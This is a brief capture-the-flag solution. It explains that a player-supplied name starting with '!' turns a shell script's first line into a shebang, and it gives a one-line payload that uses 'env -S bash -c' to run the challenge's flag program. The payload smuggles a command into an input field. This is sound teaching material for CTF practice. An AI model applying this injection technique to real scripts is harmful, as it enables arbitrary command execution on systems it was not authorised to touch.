# Solution

The vulnerability is in the first line of the shell script. Players can send a
name starting with an exclamation mark, making the first line a shebang line.

The solution is simply:
```
r.sendline('!/usr/bin/env -S bash -c "/get_flag Give flag please" \\\nwherever\nyes\nno\n')
```
